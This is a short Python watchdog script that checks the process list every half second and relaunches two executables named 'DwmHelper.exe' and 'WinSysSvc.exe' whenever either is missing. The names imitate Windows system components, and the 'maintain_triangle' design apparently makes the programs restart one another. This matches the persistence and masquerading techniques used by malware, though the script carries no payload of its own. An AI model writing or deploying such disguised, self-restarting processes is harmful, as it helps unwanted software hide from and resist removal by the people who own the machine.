import psutil
import subprocess
import time

# Use the names you gave them in the PyInstaller command
SIBLINGS = ["DwmHelper.exe", "WinSysSvc.exe"]

def maintain_triangle():
    for exe in SIBLINGS:
        # Check if the renamed executable is in the process list
        if not any(proc.name() == exe for proc in psutil.process_iter()):
            print(f"Restarting {exe}...")
            subprocess.Popen([exe]) # Run the .exe directly

if __name__ == "__main__":
    while True:
        maintain_triangle()
        time.sleep(0.5)
